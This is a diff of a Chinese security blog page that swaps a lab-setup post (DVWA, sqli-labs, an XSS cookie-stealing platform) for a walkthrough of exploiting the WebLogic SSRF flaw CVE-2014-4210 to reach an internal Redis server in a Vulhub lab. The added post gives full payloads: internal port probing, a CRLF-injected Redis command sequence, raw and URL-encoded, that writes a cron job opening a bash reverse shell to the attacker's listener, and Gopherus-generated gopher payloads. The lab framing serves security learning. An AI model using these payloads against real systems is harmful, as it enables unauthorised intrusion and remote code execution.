@@ -7,12 +7,12 @@
   
   
   
-  <title>渗透环境搭建 | Joner</title>
+  <title>SSRF攻击内网Redis | Joner</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="环境搭建,">
+    <meta name="keywords" content="SSRF,">
   
 
 
@@ -157,12 +157,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>渗透环境搭建</span>
+    <span>SSRF攻击内网Redis</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2019-04-08
+      2020-08-21
     </span>
     
     
@@ -172,36 +172,55 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><h3 id="DVWA介绍"><a href="#DVWA介绍" class="headerlink" title="DVWA介绍"></a>DVWA介绍</h3><p>DVWA是一款开源的渗透测试漏洞练习平台，其中内含XSS、SQL注入、文件上传漏洞、文件包含、CSRF和暴力破解等各个难度的测试环境。</p>
-<p>DVWA一共包含十个模块，每个模块的代码都有4种安全等级：Low、Medium、High、Impossible，下面是是个模块的内容</p>
-<p>1.Bruce Force //暴力破解</p>
-<p>2.Command Injection //命令注入</p>
-<p>3.CSRF //跨站请求伪造</p>
-<p>4.File Inclusion //文件包含</p>
-<p>5.File Upload //文件上传漏洞</p>
-<p>6.Insecure CAPTCHA //不安全的验证</p>
-<p>7.SQL Injection //sql注入</p>
-<p>8.SQL Injection（Blind） //sql注入（盲注）</p>
-<p>9.XSS（Reflected） //反射型XSS</p>
-<p>10.XSS（Stored） //存储型XSS</p>
-<h3 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h3><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">DVWA</a></p>
-<p>在github上下载DVWA项目，将它放到站点目录下，然后到<code>config</code>目录下修改<code>config.inc.php.dist</code>文件，将以下几处根据自己的情况做修改</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA = <span class="keyword">array</span>();</span><br><span class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;	<span class="comment">#数据库名称</span></span><br><span class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'root'</span>;	<span class="comment">#数据库用户名</span></span><br><span class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span class="string">'p@ssw0rd'</span>;<span class="comment">#数据库密码</span></span><br></pre></td></tr></table></figure>
-<p>修改完成后，<strong>将文件名后面的.dist去掉</strong>，然后进入通过浏览器进入<code>http://127.0.0.1/DVWA-master/setup.php</code>，单击<code>Create/Reset Database</code>按钮进行安装，安装后使用默认用户名密码<code>admin/password</code>即可进入</p>
-<h2 id="搭建sqli-labs注入平台"><a href="#搭建sqli-labs注入平台" class="headerlink" title="搭建sqli-labs注入平台"></a>搭建sqli-labs注入平台</h2><h3 id="sqli-labs介绍"><a href="#sqli-labs介绍" class="headerlink" title="sqli-labs介绍"></a>sqli-labs介绍</h3><p>sqli-labs是一款学SQL注入的开源平台，共有75种不同类型的注入</p>
-<ul>
-<li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">地址</a></li>
-</ul>
-<h3 id="安装sqli-labs"><a href="#安装sqli-labs" class="headerlink" title="安装sqli-labs"></a>安装sqli-labs</h3><p>在github上下载源码后，打开<code>sql-connections</code>文件夹中的<code>db-creds.inc</code>文件，在下面几处根据自己的情况做修改，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//give your mysql connection username n password</span></span><br><span class="line">$dbuser =<span class="string">'root'</span>;	 <span class="comment">#数据库用户名	</span></span><br><span class="line">$dbpass =<span class="string">'11111'</span>;	 <span class="comment">#数据库密码</span></span><br><span class="line">$dbname =<span class="string">"security"</span>; <span class="comment">#数据库名称</span></span><br><span class="line">$host = <span class="string">'localhost'</span>; <span class="comment">#地址</span></span><br><span class="line">$dbname1 = <span class="string">"challenges"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后在浏览器中打开<code>http://127.0.0.1/sqli-labs-master</code>，点击<code>Setup/reset Database for labs</code>进行安装。当页面出现数据库等创建成功的页面时，就表示安装成功了。</p>
-<h2 id="搭建XSS测试平台"><a href="#搭建XSS测试平台" class="headerlink" title="搭建XSS测试平台"></a>搭建XSS测试平台</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XSS测试平台是测试XSS漏洞获取cookie并接收Web页面的平台，XSS可以做JS所有能做的事，包括但不仅限于窃取cookie、后台文章处理、钓鱼、网页重定向、获取用户信息等，下面使用的是xsser测试平台的源码。</p>
-<h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p>下载源码后，将它解压到网站目录，打开<code>config.php</code>文件，修改如下部分的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'dbHost'</span>]		= <span class="string">""</span>;			<span class="comment">//数据库地址</span></span><br><span class="line">$config[<span class="string">'dbUser'</span>]		= <span class="string">""</span>;				<span class="comment">//用户</span></span><br><span class="line">$config[<span class="string">'dbPwd'</span>]		= <span class="string">""</span>;				<span class="comment">//密码</span></span><br><span class="line">$config[<span class="string">'database'</span>]		= <span class="string">""</span>;			<span class="comment">//数据库名</span></span><br><span class="line">$config[<span class="string">'charset'</span>]		=<span class="string">'utf8'</span>;				<span class="comment">//数据库字符集</span></span><br><span class="line">$config[<span class="string">'tbPrefix'</span>]		=<span class="string">'oc_'</span>;					<span class="comment">//表名前缀</span></span><br><span class="line">$config[<span class="string">'dbType'</span>]		=<span class="string">'mysql'</span>;			<span class="comment">//数据库类型(目前只支持mysql)</span></span><br><span class="line"><span class="comment">/* 注册配置 */</span></span><br><span class="line">$config[<span class="string">'register'</span>]		=<span class="string">'normal'</span>;				<span class="comment">//normal,正常;invite,只允许邀请注册;close,关闭注册功能</span></span><br><span class="line">$config[<span class="string">'mailauth'</span>]		=<span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
-<p>首先在数据库中建立一个专门的库，这里以<code>xsser</code>举例，然后选中这个库，导入文件夹中的<code>xssplatform.sql</code>数据库文件，然后执行</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> oc_module SETcode=<span class="keyword">REPLACE</span>(code,<span class="string">'http://xsser.me'</span>,<span class="string">'http://localhost/xsserme'</span>)</span><br></pre></td></tr></table></figure>
-<p>同时需要修改<code>authtest.php</code>中的网址改为自己的URL。</p>
-<p>接下来访问搭建XSS平台的URL,首先注册新用户，然后在oc_user表中修改注册用户的adminLevel为1，再将config.php注册配置中的normal改为invite。</p>
+      <h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF(server-side request forgery ):服务器端请求伪造。是一种由攻击者构造形成而由服务器端发起请求的一个安全漏洞，因为他是由服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统，在一般情况下，ssrf攻击的目标是从外网无法访问的内部系统。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次使用的靶机是Vulhub中的一个环境，搭建方法：将vulhub项目git到本地，切换到vulhub/weblogic/ssrf目录下，使用下面的命令进行搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>搭建成功后使用<code>docker ps</code>命令可以看到正在运行的容器，其中Weblogic监听在7001端口，访问<a href="http://192.168.233.150:7001/console/地址会跳转到登录页面。" target="_blank" rel="noopener">http://192.168.233.150:7001/console/地址会跳转到登录页面。</a></p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819131140623.png" alt="image-20200819131140623"></p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>通过公网Weblgic 存在SSRF漏洞(CVE-2014-4210)，探测到内网某IP开放6379端口并运行着Redis服务，利用HTTP注入和Redis未授权访问漏洞进行反弹shell</p>
+<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><h3 id="发现SSRF"><a href="#发现SSRF" class="headerlink" title="发现SSRF"></a>发现SSRF</h3><p>通过了解CVE-2014-4210可以知道， 漏洞位置在uddiexplorer下的SearchPublicRegistries.jsp处 ，因此我们可以直接访问 <a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp进入到存在漏洞的页面，在`Search" target="_blank" rel="noopener">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp进入到存在漏洞的页面，在`Search</a> by business name`处输入test 点击Search进行测试</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819131851545.png" alt="image-20200819131851545"></p>
+<p>这时我们查看刚才整个过程的请求和相应包</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819132221354.png" alt="image-20200819132221354"></p>
+<p>在operator参数中发现了url地址，这时我们对请求的内容进行修改，进行内网探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p>在返回的数据包中出现了如现错误</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819132540337.png" alt="image-20200819132540337"></p>
+<p>当访问其他未开放的端口时，会出现以下错误</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819132904817.png" alt="image-20200819132904817"></p>
+<h3 id="发现Redis服务器"><a href="#发现Redis服务器" class="headerlink" title="发现Redis服务器"></a>发现Redis服务器</h3><p>这时就可以使用Burp的intruder模块对内网ip和端口进行探测，或者是使用脚本进行探测，通过探测可以发现172.18.0.2:6378端口可以连通</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819135332850.png" alt="image-20200819135332850"></p>
+<h3 id="Redis反弹shell-header-CRLF-注入"><a href="#Redis反弹shell-header-CRLF-注入" class="headerlink" title="Redis反弹shell(header CRLF 注入)"></a>Redis反弹shell(header CRLF 注入)</h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个<code>GET</code>请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。  </p>
+<p>发送三条redis命令，将反弹shell的语句写入到/etc/corntab中</p>
+<blockquote>
+<p> crontab就是linux下的一个定时执行事件的一个程序 ，可以通过向/etc/corntab中写入相应命令，以一定时间间隔调度一些命令的执行 </p>
+</blockquote>
+<p>首先在攻击机上设置端口监听，在windows下的监听命令为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 9696</span><br></pre></td></tr></table></figure>
+<p>这里写入的命令如下，其中的ip地址和端口为设置nc监听的机器ip和监听端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.233.153/9696 0&gt;&amp;1\n\n\n\n"</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">hhh</span><br></pre></td></tr></table></figure>
+<p>因为服务器接收到数据会对数据进行url解码，所以这里先对写入的命令进行url编码，其中换行符<code>\r\n</code>，对应编码后的内容为<code>%0D%0A</code></p>
+<p>注意这里使用一些软件进行URL编码时并不会将换行符编码为<code>%0D%0A</code>而是<code>%0A</code>，所以需要注意以下并进行手动替换，替换后的payload为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">test%</span><span class="bash">0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.233.153%2F9696%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Ahhh</span></span><br></pre></td></tr></table></figure>
+<p>最终post的数据为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">operator=http://172.18.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.233.153%2F9696%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Ahhh&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819142002604.png" alt="image-20200819142002604"></p>
+<p>提交后就可以在监听的终端中拿到 shell了</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819142027755.png" alt="image-20200819142027755"></p>
+<h3 id="Redis反弹shell-gophar协议"><a href="#Redis反弹shell-gophar协议" class="headerlink" title="Redis反弹shell(gophar协议)"></a>Redis反弹shell(gophar协议)</h3><p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 </p>
+<p>这里介绍一个Gophar协议利用工具<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopharus</a></p>
+<blockquote>
+<p>该工具将帮助您生成Gopher有效负载，以利用SSRF（服务器端请求伪造）并获得RCE（远程代码执行）。 而且，它将帮助您在受害服务器上获得shell</p>
+</blockquote>
+<p>使用方法非常简单，按照提示就可以生成payload了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819151555244.png" alt="image-20200819151555244"></p>
+<p>首先根据提示进行监听，然后将生成的payload放入burp相应的位置修改ip后进行提交，但在这里会提示如下错误</p>
+<p>An error has occurred<br>weblogic.uddi.client.structures.exception.XML_SoapException: unknown protocol: gopher</p>
+<p>也就是说这里不能使用gophar协议，如果是在其他环境下支持gophar协议的话就可以这样进行攻击了，但是这里可以将生成payload中的gophar改为http，然后Go一下，同样能得到shell</p>
+<p><img src="/2020/08/21/SSRF攻击内网Redis/image-20200819152703232.png" alt="image-20200819152703232"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SSRF漏洞本身危害不大，好多SRC上都将它评为低危，但由于它可以访问一些无法访问的内部系统，因此一旦它和其他漏洞进行结合利用，其危害不容小觑。</p>
+<p><strong>本文首发<a href="https://bbs.ichunqiu.com/thread-58263-1-1.html" target="_blank" rel="noopener">i春秋</a></strong></p>
     </div>
   </div>
   
@@ -212,7 +231,7 @@
         
           本文作者 : JONER <br>
         
-        原文链接 : <a href>http://joner11234.github.io/2019/04/08/渗透环境搭建/</a><br>
+        原文链接 : <a href>http://joner11234.github.io/2020/08/21/SSRF攻击内网Redis/</a><br>
         版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
         </blockquote>
       </div>
@@ -235,8 +254,8 @@
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/环境搭建/">
-              #环境搭建
+            <a href="/tags/SSRF/">
+              #SSRF
             </a>
           </span>
           
@@ -261,15 +280,9 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2019/04/05/sqli-labs-Less9-10基于时间的盲注/" target="_self">sqli-labs Less9-10 基于时间的盲注</a>
+        <a href="/2020/06/28/Apache-Shiro反序列化复现/" target="_self">Apache Shiro反序列化复现</a>
       </div>
     
-    
-      <div class="nav-next">
-        下一篇:
-        <a href="/2019/04/08/SQLMap使用/" target="_self">SQLMap使用</a>
-        <i class="iconfont icon-next"></i>
-      </div>
     
   </nav>
 
